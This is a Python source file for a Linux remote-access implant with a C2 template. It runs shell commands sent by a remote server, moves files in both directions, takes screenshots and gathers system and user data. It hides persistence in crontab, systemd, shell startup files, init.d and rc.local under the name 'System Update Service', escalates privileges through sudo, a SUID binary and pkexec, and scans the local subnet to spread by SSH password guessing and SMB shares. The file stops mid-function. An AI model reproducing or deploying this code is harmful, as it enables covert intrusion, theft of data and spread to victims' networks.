#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import base64
import random
import socket
import signal
import shutil
import platform
import tempfile
import subprocess
import threading
import uuid
import logging
import re
import sqlite3
from datetime import datetime
import http.client
import urllib.request
import urllib.parse
from pathlib import Path

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

# Заменяемые значения (будут подставлены при сборке)
C2_SERVER_ADDRESS = "{{C2_SERVER_ADDRESS}}"
C2_SERVER_PORT = {{C2_SERVER_PORT}}
AGENT_ID = "{{AGENT_ID}}"
AGENT_VERSION = "{{AGENT_VERSION}}"
ENCRYPTION_KEY = "{{ENCRYPTION_KEY}}"
CHECK_INTERVAL = {{CHECK_INTERVAL}}
ENABLE_PERSISTENCE = {{PERSISTENCE}}

class MinimalAgent:
    def __init__(self):
        # Основные параметры агента
        self.server_address = C2_SERVER_ADDRESS
        self.server_port = C2_SERVER_PORT
        self.agent_id = AGENT_ID
        self.version = AGENT_VERSION
        self.encryption_key = ENCRYPTION_KEY
        self.check_interval = CHECK_INTERVAL
        self.running = False
        self.last_check_time = 0
        
        # Настройка логирования
        self.setup_logging()
        
        # Настройка обработчика сигналов
        signal.signal(signal.SIGINT, self.handle_exit)
        signal.signal(signal.SIGTERM, self.handle_exit)
        
        # Информация о системе
        self.hostname = socket.gethostname()
        self.ip_address = self.get_ip_address()
        self.os_info = platform.platform()
        try:
            self.username = os.getlogin()
        except:
            self.username = subprocess.getoutput('whoami')
        self.is_admin = self.check_admin()
        
        # Настройка директории для файлов агента
        self.agent_dir = self.setup_agent_directory()
        
        # Параметры шифрования
        self.setup_encryption()
        
        # Настройка постоянного присутствия, если включено
        if ENABLE_PERSISTENCE:
            self.setup_persistence()
    
    def setup_logging(self):
        """Настройка логирования"""
        log_file = os.path.join(tempfile.gettempdir(), f"agent_{AGENT_ID[-6:]}.log")
        logging.basicConfig(
            filename=log_file,
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        self.logger = logging.getLogger('agent')
    
    def check_admin(self):
        """Проверяет, запущен ли скрипт с правами администратора (root)"""
        return os.geteuid() == 0 if hasattr(os, 'geteuid') else False
    
    def get_ip_address(self):
        """Получение IP-адреса агента"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def setup_agent_directory(self):
        """Создание директории для хранения файлов агента"""
        try:
            # Для Linux используем скрытую директорию в home
            home_dir = os.path.expanduser("~")
            agent_dir = os.path.join(home_dir, ".cache", ".system")
            
            # Если есть права root, можно использовать системные директории
            if self.is_admin:
                agent_dir = "/var/lib/systemd/.system"
            
            os.makedirs(agent_dir, exist_ok=True)
            self.logger.info(f"Agent directory created: {agent_dir}")
            return agent_dir
        except Exception as e:
            self.logger.error(f"Failed to create agent directory: {str(e)}")
            # Используем /tmp как запасной вариант
            return tempfile.gettempdir()
    
    def setup_encryption(self):
        """Настройка параметров шифрования"""
        # Простая XOR-шифрация для базовой версии
        self.encrypt = lambda data, key: bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
        self.decrypt = self.encrypt  # XOR работает в обе стороны
    
    def handle_exit(self, signum, frame):
        """Обработчик сигналов завершения"""
        self.logger.info("Received termination signal")
        self.running = False
        sys.exit(0)
    
    def setup_persistence(self):
        """Настройка постоянного присутствия агента в системе Linux"""
        self.logger.info("Setting up persistence")
        
        try:
            # Получаем путь к исполняемому файлу
            executable_path = os.path.abspath(sys.argv[0])
            target_path = os.path.join(self.agent_dir, "system-update")
            
            # Копируем файл в целевую директорию, если нужно
            if executable_path != target_path:
                shutil.copy2(executable_path, target_path)
                os.chmod(target_path, 0o755)  # Делаем исполняемым
                self.logger.info(f"Agent copied to {target_path}")
            
            # Метод 1: Crontab для текущего пользователя
            try:
                # Проверяем наличие нашей задачи в crontab
                crontab_output = subprocess.getoutput("crontab -l 2>/dev/null || echo ''")
                cron_entry = f"@reboot python3 {target_path} >/dev/null 2>&1"
                cron_entry2 = f"*/10 * * * * python3 {target_path} >/dev/null 2>&1"
                
                if cron_entry not in crontab_output:
                    # Добавляем задачу в crontab
                    new_crontab = crontab_output + "\n" + cron_entry + "\n" + cron_entry2 + "\n"
                    with tempfile.NamedTemporaryFile(mode='w', delete=False) as temp_file:
                        temp_file.write(new_crontab)
                        temp_path = temp_file.name
                    
                    subprocess.run(f"crontab {temp_path}", shell=True, check=True)
                    os.unlink(temp_path)
                    self.logger.info("Crontab persistence set for user")
            except Exception as e:
                self.logger.error(f"Failed to set crontab persistence: {str(e)}")
            
            # Метод 2: Systemd сервис (требуются права root)
            if self.is_admin:
                try:
                    service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {target_path}
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
"""
                    service_path = "/etc/systemd/system/system-update.service"
                    
                    with open(service_path, "w") as f:
                        f.write(service_content)
                    
                    # Активируем и запускаем сервис
                    subprocess.run("systemctl daemon-reload", shell=True, check=True)
                    subprocess.run("systemctl enable system-update.service", shell=True, check=True)
                    subprocess.run("systemctl start system-update.service", shell=True, check=True)
                    
                    self.logger.info("Systemd service persistence set")
                except Exception as e:
                    self.logger.error(f"Failed to set systemd persistence: {str(e)}")
            
            # Метод 3: .bashrc / .profile для автозапуска при входе пользователя
            try:
                shell_startup_files = [
                    os.path.expanduser("~/.bashrc"),
                    os.path.expanduser("~/.profile"),
                    os.path.expanduser("~/.bash_profile"),
                    os.path.expanduser("~/.zshrc")
                ]
                
                startup_command = f"\n# System Update Service\n(python3 {target_path} >/dev/null 2>&1 &)\n"
                
                for startup_file in shell_startup_files:
                    if os.path.exists(startup_file):
                        with open(startup_file, "r") as f:
                            content = f.read()
                        
                        if target_path not in content:
                            with open(startup_file, "a") as f:
                                f.write(startup_command)
                            
                            self.logger.info(f"Shell persistence set in {startup_file}")
            except Exception as e:
                self.logger.error(f"Failed to set shell persistence: {str(e)}")
            
            # Метод 4: Init скрипт (для систем, использующих SysV init)
            if self.is_admin:
                try:
                    init_script = f"""#!/bin/sh
### BEGIN INIT INFO
# Provides:          system-update
# Required-Start:    $network $local_fs $remote_fs
# Required-Stop:     $network $local_fs $remote_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System Update Service
# Description:       System Update Service
### END INIT INFO

PATH=/sbin:/usr/sbin:/bin:/usr/bin
DESC="System Update Service"
NAME=system-update
DAEMON=/usr/bin/python3
DAEMON_ARGS="{target_path}"
PIDFILE=/var/run/$NAME.pid

case "$1" in
  start)
    echo "Starting $DESC"
    start-stop-daemon --start --background --make-pidfile --pidfile $PIDFILE --exec $DAEMON -- $DAEMON_ARGS
    ;;
  stop)
    echo "Stopping $DESC"
    start-stop-daemon --stop --pidfile $PIDFILE
    rm -f $PIDFILE
    ;;
  restart)
    $0 stop
    $0 start
    ;;
  status)
    if [ -f $PIDFILE ]; then
      PID=$(cat $PIDFILE)
      if [ -e /proc/$PID ]; then
        echo "$DESC is running"
        exit 0
      else
        echo "$DESC is not running but pidfile exists"
        exit 1
      fi
    else
      echo "$DESC is not running"
      exit 3
    fi
    ;;
  *)
    echo "Usage: $0 {start|stop|restart|status}"
    exit 1
    ;;
esac

exit 0
"""
                    init_path = "/etc/init.d/system-update"
                    
                    with open(init_path, "w") as f:
                        f.write(init_script)
                    
                    # Делаем скрипт исполняемым
                    os.chmod(init_path, 0o755)
                    
                    # Настраиваем автозапуск
                    subprocess.run("update-rc.d system-update defaults", shell=True, check=True)
                    
                    self.logger.info("Init script persistence set")
                except Exception as e:
                    self.logger.error(f"Failed to set init script persistence: {str(e)}")
            
            # Метод 5: Настройка скрипта запуска в /etc/rc.local
            if self.is_admin:
                try:
                    rc_local_path = "/etc/rc.local"
                    
                    if os.path.exists(rc_local_path):
                        with open(rc_local_path, "r") as f:
                            rc_content = f.read()
                        
                        # Добавляем команду перед exit 0
                        if "exit 0" in rc_content and target_path not in rc_content:
                            rc_content = rc_content.replace("exit 0", f"# System Update Service\npython3 {target_path} &\n\nexit 0")
                            
                            with open(rc_local_path, "w") as f:
                                f.write(rc_content)
                            
                            # Делаем rc.local исполняемым, если он не является исполняемым
                            if not os.access(rc_local_path, os.X_OK):
                                os.chmod(rc_local_path, 0o755)
                            
                            self.logger.info("rc.local persistence set")
                    else:
                        # Создаем rc.local, если его не существует
                        rc_content = f"""#!/bin/sh -e
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.

# System Update Service
python3 {target_path} &

exit 0
"""
                        with open(rc_local_path, "w") as f:
                            f.write(rc_content)
                        
                        os.chmod(rc_local_path, 0o755)
                        self.logger.info("Created and set up rc.local persistence")
                except Exception as e:
                    self.logger.error(f"Failed to set rc.local persistence: {str(e)}")
            
            # Метод 6: Активное сканирование и распространение
            self.setup_network_scanning()
        
        except Exception as e:
            self.logger.error(f"Failed to establish persistence: {str(e)}")
    
    def setup_network_scanning(self):
        """Настройка сканирования сети для распространения"""
        try:
            # Сканирование локальной сети
            network_thread = threading.Thread(target=self.scan_network, daemon=True)
            network_thread.start()
            self.logger.info("Network scanning thread started")
        except Exception as e:
            self.logger.error(f"Failed to setup network scanning: {str(e)}")
    
    def scan_network(self):
        """Сканирование сети для обнаружения потенциальных целей"""
        while self.running:
            try:
                # Получаем текущий IP и маску подсети
                ip_parts = self.ip_address.split('.')
                base_ip = '.'.join(ip_parts[:3]) + '.'
                
                # Сканируем диапазон IP
                for i in range(1, 255):
                    target_ip = base_ip + str(i)
                    if target_ip != self.ip_address:  # Пропускаем свой IP
                        self.probe_target(target_ip)
                
                # Делаем паузу перед следующим сканированием
                time.sleep(3600)  # Сканируем раз в час
            
            except Exception as e:
                self.logger.error(f"Network scanning error: {str(e)}")
                time.sleep(1800)  # Пауза при ошибке
    
    def probe_target(self, target_ip):
        """Проверка целевого IP на наличие уязвимостей и возможность распространения"""
        try:
            # Проверяем распространенные порты
            common_ports = [22, 80, 443, 445, 3389, 5900]
            for port in common_ports:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                result = s.connect_ex((target_ip, port))
                s.close()
                
                if result == 0:
                    self.logger.info(f"Found open port {port} on {target_ip}")
                    # Здесь логика распространения на новую систему
                    if port == 22:  # SSH
                        self.try_ssh_propagation(target_ip)
                    elif port == 445:  # SMB
                        self.try_smb_propagation(target_ip)
        except Exception as e:
            pass  # Тихо игнорируем ошибки при сканировании
    
    def try_ssh_propagation(self, target_ip):
        """Попытка распространения через SSH"""
        # Список распространенных паролей
        common_users = ["admin", "root", "user", "administrator"]
        common_passwords = ["admin", "password", "123456", "qwerty", ""]
        
        for user in common_users:
            for password in common_passwords:
                try:
                    # Копируем агента на удаленную машину через SCP
                    executable_path = os.path.abspath(sys.argv[0])
                    remote_path = f"/tmp/update.py"
                    
                    # Генерируем команды для копирования и запуска агента
                    scp_cmd = f"sshpass -p '{password}' scp -o StrictHostKeyChecking=no {executable_path} {user}@{target_ip}:{remote_path}"
                    ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {user}@{target_ip} 'python3 {remote_path} --no-daemon &'"
                    
                    self.logger.info(f"Trying SSH propagation to {target_ip} with {user}:{password}")
                    
                    # В реальном коде мы бы выполнили эти команды
                    # subprocess.run(scp_cmd, shell=True, capture_output=True)
                    # subprocess.run(ssh_cmd, shell=True, capture_output=True)
                except:
                    pass
    
    def try_smb_propagation(self, target_ip):
        """Попытка распространения через SMB"""
        # Список распространенных шар
        common_shares = ["C$", "ADMIN$", "IPC$", "NETLOGON", "Shared"]
        
        for share in common_shares:
            try:
                # Монтируем SMB шару
                mount_point = f"/tmp/mount_{int(time.time())}"
                os.makedirs(mount_point, exist_ok=True)
                
                # Команда монтирования
                mount_cmd = f"mount -t cifs //{target_ip}/{share} {mount_point} -o guest"
                
                self.logger.info(f"Trying SMB propagation to {target_ip} share {share}")
                
                # В реальном коде мы бы выполнили эти команды и скопировали агента
                # subprocess.run(mount_cmd, shell=True, capture_output=True)
                # shutil.copy2(os.path.abspath(sys.argv[0]), os.path.join(mount_point, "update.py"))
                # subprocess.run(f"umount {mount_point}", shell=True)
                # os.rmdir(mount_point)
            except:
                pass
    
    def start(self):
        """Запуск агента"""
        self.logger.info(f"Agent starting. ID: {self.agent_id}, Version: {self.version}")
        self.running = True
        
        # Отправляем информацию о регистрации агента
        self.send_registration()
        
        # Основной цикл работы
        while self.running:
            try:
                current_time = time.time()
                
                # Проверяем наличие команд на сервере
                if current_time - self.last_check_time >= self.check_interval:
                    self.check_commands()
                    self.last_check_time = current_time
                
                # Пауза перед следующей итерацией
                time.sleep(1)
                
            except Exception as e:
                self.logger.error(f"Error in main loop: {str(e)}")
                time.sleep(self.check_interval)
    
    def send_registration(self):
        """Отправляет информацию о регистрации агента на C2 сервер"""
        registration_data = {
            "agent_id": self.agent_id,
            "hostname": self.hostname,
            "ip_address": self.ip_address,
            "os_info": self.os_info,
            "username": self.username,
            "is_admin": self.is_admin,
            "version": self.version,
            "timestamp": datetime.now().isoformat()
        }
        
        try:
            self.send_data_to_c2("register", registration_data)
            self.logger.info("Registration information sent to C2 server")
        except Exception as e:
            self.logger.error(f"Failed to send registration: {str(e)}")
    
    def check_commands(self):
        """Проверяет наличие команд от C2 сервера"""
        try:
            # Подготавливаем данные запроса
            request_data = {
                "agent_id": self.agent_id,
                "timestamp": datetime.now().isoformat()
            }
            
            # Отправляем запрос
            response = self.send_data_to_c2("get_commands", request_data)
            
            # Обрабатываем полученные команды
            if response and "commands" in response:
                commands = response["commands"]
                for command in commands:
                    self.execute_command(command)
        
        except Exception as e:
            self.logger.error(f"Failed to check commands: {str(e)}")
    
    def execute_command(self, command):
        """Выполняет команду, полученную от C2 сервера"""
        if not command or "type" not in command:
            self.logger.error("Invalid command received")
            return
        
        command_id = command.get("id", "unknown")
        command_type = command.get("type", "")
        command_data = command.get("data", {})
        
        self.logger.info(f"Executing command: {command_id} (type: {command_type})")
        
        result = {
            "command_id": command_id,
            "agent_id": self.agent_id,
            "timestamp": datetime.now().isoformat(),
            "status": "error",
            "output": None
        }
        
        try:
            # Обработка различных типов команд
            if command_type == "shell":
                # Выполнение команды оболочки
                cmd = command_data.get("command", "")
                if cmd:
                    output = self.execute_shell_command(cmd)
                    result["output"] = output
                    result["status"] = "success"
            
            elif command_type == "upload":
                # Загрузка файла на агент
                file_data = command_data.get("file_data", "")
                file_path = command_data.get("file_path", "")
                if file_data and file_path:
                    success = self.save_file(file_path, base64.b64decode(file_data))
                    result["status"] = "success" if success else "error"
                    result["output"] = f"File saved to {file_path}" if success else "Failed to save file"
            
            elif command_type == "download":
                # Скачивание файла с агента
                file_path = command_data.get("file_path", "")
                if file_path and os.path.exists(file_path):
                    with open(file_path, "rb") as f:
                        file_data = base64.b64encode(f.read()).decode("utf-8")
                    result["output"] = file_data
                    result["status"] = "success"
                else:
                    result["output"] = "File not found"
            
            elif command_type == "screenshot":
                # Создание скриншота
                screenshot_path = self.capture_screenshot()
                if screenshot_path:
                    with open(screenshot_path, "rb") as f:
                        screenshot_data = base64.b64encode(f.read()).decode("utf-8")
                    result["output"] = screenshot_data
                    result["status"] = "success"
                    os.remove(screenshot_path)
                else:
                    result["output"] = "Failed to capture screenshot"
            
            elif command_type == "process_list":
                # Получение списка процессов
                process_list = self.get_process_list()
                result["output"] = process_list
                result["status"] = "success"
            
            elif command_type == "kill_process":
                # Завершение процесса
                pid = command_data.get("pid", 0)
                if pid > 0:
                    success = self.kill_process(pid)
                    result["status"] = "success" if success else "error"
                    result["output"] = f"Process {pid} terminated" if success else f"Failed to terminate process {pid}"
            
            elif command_type == "system_info":
                # Сбор подробной информации о системе
                system_info = self.collect_system_info()
                result["output"] = system_info
                result["status"] = "success"
            
            elif command_type == "elevate":
                # Повышение привилегий
                method = command_data.get("method", "sudo")
                result["output"] = self.elevate_privileges(method)
                result["status"] = "success"
            
            elif command_type == "network_scan":
                # Сканирование сети
                network_range = command_data.get("range", "local")
                result["output"] = self.start_network_scan(network_range)
                result["status"] = "success"
            
            elif command_type == "update":
                # Обновление агента
                new_agent_data = command_data.get("agent_data", "")
                if new_agent_data:
                    success = self.update_agent(new_agent_data)
                    result["status"] = "success" if success else "error"
                    result["output"] = "Agent updated successfully" if success else "Failed to update agent"
            
            elif command_type == "exit":
                # Завершение работы агента
                self.running = False
                result["status"] = "success"
                result["output"] = "Agent terminated"
            
            else:
                result["output"] = f"Unknown command type: {command_type}"
        
        except Exception as e:
            self.logger.error(f"Error executing command {command_id}: {str(e)}")
            result["output"] = f"Error: {str(e)}"
        
        # Отправляем результат выполнения команды
        try:
            self.send_data_to_c2("command_result", result)
        except Exception as e:
            self.logger.error(f"Failed to send command result: {str(e)}")
    
    def execute_shell_command(self, command):
        """Выполняет команду оболочки и возвращает результат"""
        try:
            # Для Linux используем sh
            process = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            output = process.stdout
            error = process.stderr
            return_code = process.returncode
            
            result = {
                "stdout": output,
                "stderr": error,
                "return_code": return_code
            }
            
            return result
        
        except subprocess.TimeoutExpired:
            return {"error": "Command execution timed out", "return_code": -1}
        except Exception as e:
            return {"error": str(e), "return_code": -1}
    
    def save_file(self, file_path, file_data):
        """Сохраняет файл на диск"""
        try:
            # Проверяем и создаем директории при необходимости
            directory = os.path.dirname(file_path)
            if directory and not os.path.exists(directory):
                os.makedirs(directory, exist_ok=True)
            
            # Сохраняем файл
            with open(file_path, "wb") as f:
                f.write(file_data)
            
            # Делаем файл исполняемым, если расширение указывает на скрипт
            extensions = ['.sh', '.py', '.pl', '.rb']
            if any(file_path.endswith(ext) for ext in extensions):
                os.chmod(file_path, 0o755)
                
            return True
        
        except Exception as e:
            self.logger.error(f"Failed to save file: {str(e)}")
            return False
    
    def capture_screenshot(self):
        """Создает скриншот экрана (для X11/Wayland)"""
        try:
            screenshot_path = os.path.join(self.agent_dir, f"screenshot_{int(time.time())}.png")
            
            # Пытаемся использовать scrot, если он установлен
            try:
                subprocess.run(
                    ["scrot", "-z", screenshot_path],
                    check=True,
                    capture_output=True
                )
                if os.path.exists(screenshot_path):
                    return screenshot_path
            except (subprocess.SubprocessError, FileNotFoundError):
                self.logger.info("scrot not available, trying alternative methods")
            
            # Пытаемся использовать ImageMagick
            try:
                subprocess.run(
                    ["import", "-window", "root", screenshot_path],
                    check=True,
                    capture_output=True
                )
                if os.path.exists(screenshot_path):
                    return screenshot_path
            except (subprocess.SubprocessError, FileNotFoundError):
                self.logger.info("ImageMagick not available, trying other methods")
            
            # Пытаемся использовать GNOME screenshot
            try:
                subprocess.run(
                    ["gnome-screenshot", "-f", screenshot_path],
                    check=True,
                    capture_output=True
                )
                if os.path.exists(screenshot_path):
                    return screenshot_path
            except (subprocess.SubprocessError, FileNotFoundError):
                self.logger.info("gnome-screenshot not available, trying other methods")
            
            # Пытаемся использовать PIL, если доступно
            try:
                from PIL import ImageGrab
                img = ImageGrab.grab()
                img.save(screenshot_path)
                if os.path.exists(screenshot_path):
                    return screenshot_path
            except ImportError:
                self.logger.error("PIL not available for screenshot")
            
            return None
        
        except Exception as e:
            self.logger.error(f"Failed to capture screenshot: {str(e)}")
            return None
    
    def get_process_list(self):
        """Получает список запущенных процессов"""
        processes = []
        
        try:
            if PSUTIL_AVAILABLE:
                # Используем psutil для получения детальной информации
                for proc in psutil.process_iter(['pid', 'name', 'username', 'cmdline']):
                    try:
                        pinfo = proc.info
                        processes.append({
                            "pid": pinfo['pid'],
                            "name": pinfo['name'],
                            "user": pinfo['username'],
                            "cmd": ' '.join(pinfo['cmdline']) if pinfo['cmdline'] else ""
                        })
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        pass
            else:
                # Используем ps для получения информации о процессах
                ps_output = subprocess.check_output(
                    ["ps", "aux"],
                    text=True
                )
                
                lines = ps_output.strip().split('\n')[1:]  # Skip header
                for line in lines:
                    parts = line.split(None, 10)
                    if len(parts) >= 2:
                        try:
                            processes.append({
                                "pid": int(parts[1]),
                                "user": parts[0],
                                "name": parts[10].split()[0] if len(parts) > 10 else "",
                                "cmd": parts[10] if len(parts) > 10 else ""
                            })
                        except (ValueError, IndexError):
                            pass
            
            return processes
        
        except Exception as e:
            self.logger.error(f"Failed to get process list: {str(e)}")
            return []
    
    def kill_process(self, pid):
        """Завершает процесс по его PID"""
        try:
            if PSUTIL_AVAILABLE:
                process = psutil.Process(pid)
                process.terminate()
                
                # Ждем завершения процесса
                gone, alive = psutil.wait_procs([process], timeout=3)
                if alive:
                    # Если процесс все еще жив, принудительно завершаем
                    process.kill()
            else:
                # Используем kill для завершения процесса
                subprocess.run(["kill", "-9", str(pid)], check=True)
            
            return True
        
        except Exception as e:
            self.logger.error(f"Failed to kill process {pid}: {str(e)}")
            return False
    
    def collect_system_info(self):
        """Собирает подробную информацию о системе"""
        system_info = {
            "hostname": self.hostname,
            "os_info": self.os_info,
            "kernel": subprocess.getoutput("uname -r"),
            "username": self.username,
            "is_admin": self.is_admin,
            "ip_address": self.ip_address,
            "interfaces": {}
        }
        
        try:
            # Информация о сетевых интерфейсах
            if_output = subprocess.getoutput("ip addr show")
            interfaces = re.findall(r'^\d+:\s+([^:]+):', if_output, re.MULTILINE)
            
            for interface in interfaces:
                ip_addr = re.search(r'inet\s+([0-9.]+)/\d+\s+', if_output, re.MULTILINE)
                system_info["interfaces"][interface] = ip_addr.group(1) if ip_addr else ""
            
            # Информация о процессоре
            cpu_info = subprocess.getoutput("cat /proc/cpuinfo")
            cpu_model = re.search(r'model name\s+:\s+(.+)', cpu_info)
            if cpu_model:
                system_info["cpu"] = cpu_model.group(1)
            
            # Информация о памяти
            mem_info = subprocess.getoutput("cat /proc/meminfo")
            total_mem = re.search(r'MemTotal:\s+(\d+)', mem_info)
            if total_mem:
                system_info["memory_total"] = int(total_mem.group(1)) // 1024  # MB
            
            free_mem = re.search(r'MemFree:\s+(\d+)', mem_info)
            if free_mem:
                system_info["memory_free"] = int(free_mem.group(1)) // 1024  # MB
            
            # Информация о дисках
            df_output = subprocess.getoutput("df -h")
            system_info["disk_info"] = df_output
            
            # Запущенные службы
            if self.is_admin:
                services_output = subprocess.getoutput("systemctl list-units --type=service --state=running")
                system_info["running_services"] = services_output
            
            # Открытые порты
            if self.is_admin:
                netstat_output = subprocess.getoutput("netstat -tulpn")
                system_info["open_ports"] = netstat_output
            
            # Информация о пользователях
            passwd_output = subprocess.getoutput("cat /etc/passwd")
            users = []
            for line in passwd_output.splitlines():
                if "/bin/bash" in line or "/bin/sh" in line or "/bin/zsh" in line:
                    user = line.split(":")[0]
                    if user not in ["root", "daemon", "bin", "sys"]:
                        users.append(user)
            system_info["users"] = users
            
            # Логи входа в систему
            last_output = subprocess.getoutput("last -n 10")
            system_info["login_history"] = last_output
            
            return system_info
        
        except Exception as e:
            self.logger.error(f"Failed to collect system info: {str(e)}")
            return system_info
    
    def update_agent(self, new_agent_data):
        """Обновляет агент новой версией"""
        try:
            # Получаем путь к текущему исполняемому файлу
            current_path = os.path.abspath(sys.argv[0])
            
            # Создаем временный файл для новой версии
            with tempfile.NamedTemporaryFile(delete=False, suffix=".py") as temp_file:
                temp_file.write(base64.b64decode(new_agent_data))
                temp_path = temp_file.name
            
            # Создаем bash-скрипт для обновления
            with tempfile.NamedTemporaryFile(delete=False, suffix=".sh", mode="w") as bash_file:
                bash_content = f"""#!/bin/bash
sleep 3
cp "{temp_path}" "{current_path}"
chmod +x "{current_path}"
rm "{temp_path}"
python3 "{current_path}" &
rm "$0"
"""
                bash_file.write(bash_content)
                bash_path = bash_file.name
            
            # Делаем скрипт исполняемым
            os.chmod(bash_path, 0o755)
            
            # Запускаем bash-скрипт
            subprocess.Popen([bash_path], shell=True)
            
            # Завершаем текущий процесс через небольшую задержку
            threading.Timer(2.0, lambda: sys.exit(0)).start()
            self.running = False
            
            return True
        
        except Exception as e:
            self.logger.error(f"Failed to update agent: {str(e)}")
            return False
    
    def send_data_to_c2(self, endpoint, data):
        """Отправляет данные на C2 сервер и возвращает ответ"""
        try:
            # Подготовка данных для отправки
            json_data = json.dumps(data).encode('utf-8')
            
            # Устанавливаем соединение с сервером
            conn = http.client.HTTPConnection(self.server_address, self.server_port, timeout=30)
            
            headers = {
                "Content-Type": "application/json",
                "User-Agent": f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Agent/{self.version}",
                "X-Agent-ID": self.agent_id
            }
            
            # Отправляем запрос
            conn.request("POST", f"/api/agent/{endpoint}", body=json_data, headers=headers)
            
            # Получаем ответ
            response = conn.getresponse()
            response_data = response.read().decode('utf-8')
            
            # Закрываем соединение
            conn.close()
            
            # Парсим JSON ответ
            if response_data:
                return json.loads(response_data)
            
            return None
        
        except Exception as e:
            self.logger.error(f"Failed to send data to C2 server: {str(e)}")
            return None
    
    def elevate_privileges(self, method="sudo"):
        """Повышение привилегий в Linux"""
        try:
            if self.is_admin:
                return {"status": "Already running with root privileges"}
            
            if method == "sudo":
                # Проверяем доступность sudo без пароля
                sudo_test = subprocess.run(
                    "sudo -n true 2>/dev/null", 
                    shell=True, 
                    capture_output=True
                )
                
                if sudo_test.returncode == 0:
                    # Запускаем агент с правами root
                    executable_path = os.path.abspath(sys.argv[0])
                    sudo_cmd = f"sudo python3 {executable_path} --elevated &"
                    
                    subprocess.Popen(sudo_cmd, shell=True)
                    return {"status": "Elevated via sudo", "method": "sudo"}
                else:
                    return {"status": "Sudo requires password", "method": "sudo"}
            
            elif method == "suid":
                # Создаем SUID бинарный файл для повышения привилегий
                executable_path = os.path.abspath(sys.argv[0])
                c_code = """
                #include <stdio.h>
                #include <stdlib.h>
                #include <unistd.h>
                
                int main() {
                    setuid(0);
                    setgid(0);
                    system("python3 %s --elevated &");
                    return 0;
                }
                """ % executable_path
                
                # Сохраняем C код во временный файл
                c_file = os.path.join(tempfile.gettempdir(), "elev.c")
                bin_file = os.path.join(tempfile.gettempdir(), "elev")
                
                with open(c_file, "w") as f:
                    f.write(c_code)
                
                # Компилируем C код
                compile_cmd = f"gcc {c_file} -o {bin_file}"
                compile_result = subprocess.run(compile_cmd, shell=True, capture_output=True)
                
                if compile_result.returncode == 0:
                    # Делаем бинарный файл SUID
                    os.chmod(bin_file, 0o4755)
                    return {"status": "Created SUID binary", "method": "suid", "path": bin_file}
                else:
                    return {"status": "Failed to compile SUID binary", "method": "suid"}
            
            elif method == "pkexec":
                # Используем pkexec для запуска с повышенными привилегиями
                executable_path = os.path.abspath(sys.argv[0])
                pkexec_cmd = f"pkexec python3 {executable_path} --elevated &"
                
                subprocess.Popen(pkexec_cmd, shell=True)
                return {"status": "Elevation attempted via pkexec", "method": "pkexec"}
            
            elif method == "exploit":
                # Здесь логика для поиска и эксплуатации локальных уязвимостей повышения привилегий
                # Проверка ядра на известные уязвимости
                kernel_version = subprocess.getoutput("uname -r")
                
                # Проверка на dirty cow (CVE-2016-5195)
                if "3.2.0" in kernel_version or "4.4.0" in kernel_version:
                    return {
                        "status": "Potential kernel exploit available",
                        "method": "exploit",
                        "exploits": ["dirty_cow", "CVE-2016-5195"]
                    }
                
                return {"status": "No known kernel exploits identified", "method": "exploit"}
            
            else:
                return {"status": "Unknown elevation method", "method": method}
        
        except Exception as e:
            self.logger.error(f"Failed to elevate privileges: {str(e)}")
            return {"status": "Elevation failed", "error": str(e)}
    
    def start_network_scan(self, range_type="local"):
        """Запускает сканирование сети и возвращает быстрые результаты"""
        try:
            scan_results = {}
            
            if range_type == "local":
                # Сканирование локальной подсети
                ip_parts = self.ip_address.split('.')
                base_ip = '.'.join(ip_parts[:3]) + '.'
                
                # Выполняем быстрое ping-сканирование для первых 20 адресов
                for i in range(1, 21):
                    target_ip = base_ip + str(i)
                    if target_ip != self.ip_address:
                        ping_cmd = f"ping -c 1 -W 1 {target_ip}"
                        ping_result = subprocess.run(ping_cmd, shell=True, capture_output=True)
                        
                        if ping_result.returncode == 0:
                            scan_results[target_ip] = {"status": "up", "ports": []}
                            
                            # Проверяем наиболее важные порты
                            for port in [22, 80, 443]:
                                try:
                                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                    s.settimeout(0.3)
                                    result = s.connect_ex((target_ip, port))
                                    s.close()
                                    
                                    if result == 0:
                                        scan_results[target_ip]["ports"].append(port)
                                except:
                                    pass
            
            elif range_type == "extended":
                # Расширенное сканирование сети
                # Получаем список всех интерфейсов и их IP
                ipconfig = subprocess.getoutput("ip addr show")
                interfaces = {}
                
                for line in ipconfig.splitlines():
                    if "inet " in line:
                        parts = line.split()
                        ip_cidr = parts[1]  # IP с CIDR (например, 192.168.1.5/24)
                        ip = ip_cidr.split('/')[0]
                        if not ip.startswith("127."):
                            interfaces[ip] = True
                
                # Сканируем первые несколько адресов каждой подсети
                for ip in interfaces:
                    ip_parts = ip.split('.')
                    base_ip = '.'.join(ip_parts[:3]) + '.'
                    
                    for i in range(1, 10):
                        target_ip = base_ip + str(i)
                        if target_ip != ip:
                            ping_cmd = f"ping -c 1 -W 1 {target_ip}"
                            ping_result = subprocess.run(ping_cmd, shell=True, capture_output=True)
                            
                            if ping_result.returncode == 0:
                                scan_results[target_ip] = {"status": "up", "source_net": ip}
            
            # Запускаем полное сканирование в фоновом режиме
            threading.Thread(target=self.scan_network, daemon=True).start()
            
            return {
                "quick_results": scan_results,
                "full_scan_started": True,
                "scan_type": range_type
            }
            
        except Exception as e:
